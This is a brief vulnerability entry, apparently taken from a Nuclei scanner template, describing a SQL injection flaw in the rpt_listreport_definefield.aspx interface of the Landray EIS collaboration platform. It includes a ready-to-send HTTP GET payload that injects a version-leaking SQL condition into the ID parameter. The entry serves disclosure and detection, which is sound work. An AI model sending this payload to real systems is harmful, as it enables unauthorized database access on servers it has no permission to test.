# Vulnerability: Landray EIS - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`landray-eis-sqli.yaml`)

## Description
Landray's smart collaboration platform EIS has a very rich collection of modules to meet the needs of organizations and enterprises in knowledge, collaboration, and project management system construction. There is a SQL injection vulnerability in the rpt_listreport_definefield.aspx interface of Landray EIS smart collaboration platform

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+
```

